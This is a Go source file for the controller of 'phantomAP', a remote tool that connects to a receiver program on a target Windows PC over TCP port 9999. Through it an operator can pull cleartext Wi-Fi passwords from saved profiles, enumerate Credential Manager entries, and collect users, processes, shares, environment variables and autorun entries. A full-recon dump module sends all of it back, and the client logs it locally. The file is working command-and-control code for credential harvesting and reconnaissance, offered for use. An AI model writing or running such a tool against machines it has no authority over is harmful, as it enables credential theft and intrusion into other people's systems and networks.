package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strings"
	"time"
)

const port = "9999"

const (
	cGreen  = "\033[92m"
	cBlue   = "\033[94m"
	cCyan   = "\033[96m"
	cRed    = "\033[91m"
	cYellow = "\033[93m"
	cWhite  = "\033[97m"
	cDim    = "\033[90m"
	cReset  = "\033[0m"
)

type modEntry struct {
	name      string
	argNote   string
	function  string
	needsRoot bool
}

// FIX: Corrected needsRoot flags.
// FIREWALL_AUDIT and USER_ENUM were wrongly marked true —
// netsh advfirewall show allprofiles and net user/localgroup both run as standard user.
var modules = []modEntry{
	{"PROBE_NEARBY",     "-",       "802.11 beacon frame enumeration via netsh",                           false},
	{"WIFI_PASS_ALL",    "-",       "Cleartext key material extraction from all saved WLAN profiles",       false},
	{"WIFI_PASS_TARGET", ":<SSID>", "Cleartext key material from a single named WLAN profile",             false},
	{"PROF_LIST",        "-",       "Enumerate saved WLAN profile identifiers",                            false},
	{"ARP_SWEEP",        "-",       "Layer-2 host discovery via ARP cache",                               false},
	{"PORT_AUDIT",       "-",       "TCP/UDP LISTENING socket state analysis",                            false},
	{"DNS_TRACE",        "-",       "Resolver path enumeration and DNS leak detection",                   false},
	{"CONN_MONITOR",     "-",       "Established session inspection via netstat",                         false},
	{"DUMP_REPORT",      "-",       "Full recon package — all primary modules transmitted",               false},
	{"SYS_ENUM",         "-",       "Hostname, OS build, architecture, uptime, user context",             false},
	{"PROC_ENUM",        "-",       "Full process enumeration with PID and memory state",                 false},
	{"ROUTE_TABLE",      "-",       "IPv4/IPv6 routing table via route print",                            false},
	{"FIREWALL_AUDIT",   "-",       "Windows Firewall profile states and active rule summary",            false},
	{"SHARES_ENUM",      "-",       "Local and remote SMB network share enumeration",                     false},
	{"USER_ENUM",        "-",       "Local user accounts and administrator group membership",             false},
	{"STARTUP_ENUM",     "-",       "Autorun entries from registry and startup locations",                true},
	{"CRED_VAULT",       "-",       "Windows Credential Manager stored entry enumeration",                false},
	{"RDP_STATUS",       "-",       "Remote Desktop protocol state and active session query",             true},
	{"PROXY_CFG",        "-",       "System proxy configuration and WinHTTP settings",                   false},
	{"HOSTS_READ",       "-",       "Read contents of system hosts file",                                 false},
	{"ADAPTER_DEEP",     "-",       "Full NIC detail — MAC, speed, driver, link state via ipconfig /all", false},
	{"BT_SCAN",          "-",       "Paired and visible Bluetooth device enumeration",                    false},
	{"ENV_DUMP",         "-",       "System and user environment variable dump",                          false},
	{"DISK_INFO",        "-",       "Drive letters, used/free/total space, filesystem types",             false},
}

func showBanner() {
	fmt.Print("\033[2J\033[H")
	fmt.Print(cGreen)
	fmt.Println("   ____  _           _   _                  _    ____")
	fmt.Println("  |  _ \\| |__   __ _| \\ | |_ ___  _ __ ___ / \\  |  _ \\")
	fmt.Println("  | |_) | '_ \\ / _` |  \\| | __/ _ \\| '_ ` _ \\ / _ \\ | |_) |")
	fmt.Println("  |  __/| | | | (_| | |\\  | || (_) | | | | | / ___ \\|  __/")
	fmt.Println("  |_|   |_| |_|\\__,_|_| \\_|\\__\\___/|_| |_| /_/   \\_\\_|")
	fmt.Print(cReset)
	fmt.Println(cBlue + "        Built Miracle Gideon" + cReset)
	fmt.Println()
}

func getTargetIP(scanner *bufio.Scanner) string {
	fmt.Printf("%sPHANTOMAP%s >> Enter Windows PC IP: ", cCyan, cReset)
	scanner.Scan()
	ip := strings.TrimSpace(scanner.Text())
	if ip == "" {
		fmt.Printf("%sERR :: No IP entered. Exiting.%s\n", cRed, cReset)
		os.Exit(1)
	}
	return ip
}

// checkPort verifies that the receiver is reachable before showing the prompt.
// Exits if the port is closed or unreachable.
func checkPort(ip string) {
	fmt.Printf("%sCHECKING%s :: %s:%s ...\n", cDim, cReset, ip, port)
	conn, err := net.DialTimeout("tcp", ip+":"+port, 5*time.Second)
	if err != nil {
		fmt.Println()
		fmt.Printf("%sERR :: PORT UNREACHABLE%s :: %s:%s\n", cRed, cReset, ip, port)
		fmt.Printf("%sERR :: Confirm phantomAP_receiver.exe is running on the target Windows PC%s\n", cRed, cReset)
		fmt.Println()
		os.Exit(1)
	}
	conn.Close()
	fmt.Printf("%s[OK]%s PORT OPEN :: %s:%s\n", cGreen, cReset, ip, port)
	fmt.Println()
}

// saveLog writes module output to a timestamped file inside phantomAP_logs/.
func saveLog(modName, output string) string {
	logDir := "phantomAP_logs"
	if err := os.MkdirAll(logDir, 0755); err != nil {
		return ""
	}
	ts := time.Now().Format("2006-01-02_15-04-05")
	path := filepath.Join(logDir, modName+"_"+ts+".txt")
	f, err := os.Create(path)
	if err != nil {
		return ""
	}
	defer f.Close()
	f.WriteString(output)
	return path
}

// listLogs prints all saved log files with timestamps.
func listLogs() {
	entries, err := os.ReadDir("phantomAP_logs")
	if err != nil || len(entries) == 0 {
		fmt.Printf("%sNO LOGS FOUND :: phantomAP_logs/ is empty or missing%s\n", cDim, cReset)
		return
	}
	fmt.Printf("%sLOG INDEX%s :: phantomAP_logs/\n\n", cCyan, cReset)
	for i, e := range entries {
		info, err := e.Info()
		if err != nil {
			fmt.Printf("  %s%3d%s  %s\n", cWhite, i+1, cReset, e.Name())
			continue
		}
		fmt.Printf("  %s%3d%s  %-55s  %s%s%s\n",
			cWhite, i+1, cReset,
			e.Name(),
			cDim, info.ModTime().Format("2006-01-02 15:04:05"), cReset,
		)
	}
	fmt.Println()
}

// showHelp prints the full module index with arguments and function descriptions.
func showHelp() {
	fmt.Printf("%sMODULE INDEX%s\n\n", cCyan, cReset)
	fmt.Printf("  %s%-22s  %-11s  %s%s\n", cWhite, "MODULE", "ARGUMENT", "FUNCTION", cReset)
	fmt.Printf("  %s%-22s  %-11s  %s%s\n", cDim,
		strings.Repeat("-", 22), strings.Repeat("-", 11), strings.Repeat("-", 52), cReset)

	for _, m := range modules {
		rootMark := " "
		if m.needsRoot {
			rootMark = cRed + "*" + cReset
		}
		fmt.Printf("  %s%-22s%s  %s%-11s%s  %s%s%s%s\n",
			cWhite, m.name, cReset,
			cYellow, m.argNote, cReset,
			cDim, m.function, cReset,
			rootMark,
		)
	}

	fmt.Println()
	fmt.Printf("  %s%-22s%s  %s%-11s%s  %s%s%s\n", cWhite, "HELP", cReset, cYellow, "-", cReset, cDim, "Display this module index", cReset)
	fmt.Printf("  %s%-22s%s  %s%-11s%s  %s%s%s\n", cWhite, "LOGS", cReset, cYellow, "-", cReset, cDim, "List saved output log files", cReset)
	fmt.Printf("  %s%-22s%s  %s%-11s%s  %s%s%s\n", cWhite, "EXIT", cReset, cYellow, "-", cReset, cDim, "Terminate client process", cReset)
	fmt.Println()
	fmt.Printf("  %s[*] Module may require elevated privileges on the Windows receiver%s\n", cRed, cReset)
	fmt.Println()
}

// sendRequest sends a module command to the receiver and streams the response.
func sendRequest(ip, command string) {
	conn, err := net.DialTimeout("tcp", ip+":"+port, 10*time.Second)
	if err != nil {
		fmt.Printf("%sERR :: CONNECTION FAILED :: %v%s\n", cRed, err, cReset)
		return
	}
	defer conn.Close()

	// FIX: Dynamic deadline — DUMP_REPORT runs 9 modules sequentially on the
	// receiver side and needs up to 5 minutes. A flat 120s caused silent timeouts.
	modName := strings.ToUpper(strings.SplitN(command, ":", 2)[0])
	deadline := 120 * time.Second
	if modName == "DUMP_REPORT" {
		deadline = 300 * time.Second
		fmt.Printf("%sNOTE :: DUMP_REPORT transmits 9 modules — allow up to 5 minutes%s\n\n", cDim, cReset)
	}
	conn.SetDeadline(time.Now().Add(deadline))

	fmt.Fprintf(conn, "%s\n", command)

	var sb strings.Builder
	scanner := bufio.NewScanner(conn)
	buf := make([]byte, 2*1024*1024) // 2 MB — handles DUMP_REPORT output
	scanner.Buffer(buf, 2*1024*1024)

	for scanner.Scan() {
		line := scanner.Text()
		if line == "<<END>>" {
			break
		}
		sb.WriteString(line + "\n")
	}

	output := sb.String()
	if strings.TrimSpace(output) == "" {
		fmt.Printf("%sERR :: EMPTY RESPONSE :: check receiver status%s\n", cRed, cReset)
		return
	}

	fmt.Println()
	fmt.Print(output)

	if path := saveLog(modName, output); path != "" {
		fmt.Printf("%sLOG SAVED :: %s%s\n", cDim, path, cReset)
	}
	fmt.Println()
}

func main() {
	showBanner()

	scanner := bufio.NewScanner(os.Stdin)
	targetIP := getTargetIP(scanner)
	fmt.Println()
	checkPort(targetIP)

	for {
		fmt.Printf("%sPHANTOMAP%s >> ", cCyan, cReset)
		if !scanner.Scan() {
			break
		}
		input := strings.TrimSpace(scanner.Text())
		if input == "" {
			continue
		}

		// Split on first colon to separate command from optional argument.
		// Normalize command to uppercase; preserve argument case (SSIDs are case-sensitive).
		parts := strings.SplitN(input, ":", 2)
		command := strings.ToUpper(strings.TrimSpace(parts[0]))
		fullCommand := command
		if len(parts) == 2 {
			fullCommand = command + ":" + strings.TrimSpace(parts[1])
		}

		switch command {
		case "EXIT", "QUIT":
			fmt.Println()
			fmt.Printf("%sPHANTOMAP :: PROCESS TERMINATED%s\n\n", cRed, cReset)
			os.Exit(0)
		case "HELP":
			fmt.Println()
			showHelp()
		case "LOGS":
			fmt.Println()
			listLogs()
		default:
			sendRequest(targetIP, fullCommand)
		}
	}
}
